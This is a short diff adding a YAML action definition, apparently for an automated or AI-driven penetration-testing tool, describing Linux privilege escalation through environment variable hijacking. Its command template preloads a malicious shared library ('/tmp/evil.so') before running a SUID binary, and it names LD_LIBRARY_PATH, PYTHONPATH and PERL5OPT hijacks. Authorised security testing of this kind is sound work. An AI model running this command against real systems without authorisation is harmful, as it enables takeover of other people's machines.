@@ -1,0 +1,16 @@
+name: env_variable_hijack
+category: privesc
+description: Environment variable hijacking
+preconditions:
+  - os==linux
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "export LD_PRELOAD=/tmp/evil.so; {suid_binary}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "If sudo/SUID preserves env: LD_PRELOAD (load malicious shared lib), LD_LIBRARY_PATH (hijack library), PYTHONPATH (Python import hijack), PERL5OPT (Perl code injection)."
